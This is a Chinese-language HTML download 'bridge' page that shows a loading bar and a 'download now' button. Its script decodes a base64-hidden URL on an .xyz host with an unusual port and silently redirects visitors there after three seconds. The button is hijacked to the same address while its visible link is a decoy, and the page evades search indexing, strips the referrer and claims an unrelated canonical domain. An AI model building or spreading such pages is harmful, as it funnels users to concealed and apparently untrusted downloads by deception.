<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://zcloudsoft.com/">
  <title>资源准备中</title>
  <style>
    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:"Microsoft YaHei",Arial,sans-serif;color:#eef6ff;background:linear-gradient(135deg,#071024,#151a54 55%,#33156a)}.bridge{width:min(92vw,460px);padding:34px;border:1px solid rgba(130,210,255,.28);border-radius:8px;background:rgba(8,18,44,.78);box-shadow:0 28px 70px rgba(0,0,0,.35),0 0 38px rgba(86,204,255,.18);text-align:center}.bridge h1{margin:0 0 12px;font-size:28px}.bridge p{margin:8px 0;color:#c7d7ee}.bar{height:10px;border-radius:999px;background:rgba(255,255,255,.12);overflow:hidden;margin:24px 0}.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#57f2dd,#5db4ff,#9b74ff);box-shadow:0 0 18px rgba(87,242,221,.7);animation:load 3s linear forwards}.manual{display:inline-flex;align-items:center;justify-content:center;min-height:46px;padding:0 26px;border-radius:999px;color:#061327;background:linear-gradient(135deg,#71ffe7,#5db4ff 50%,#b38cff);font-weight:700;text-decoration:none;box-shadow:0 0 22px rgba(93,180,255,.35);transition:transform .2s ease,box-shadow .2s ease}.manual:hover{transform:translateY(-2px);box-shadow:0 0 34px rgba(113,255,231,.55)}@keyframes load{to{width:100%}}
  </style>
</head>
<body>
  <main class="bridge">
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="bar" aria-hidden="true"><span></span></div>
    <a class="manual" id="manualDownload" href="/download.html" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    window.setTimeout(function () {
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 3000);
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
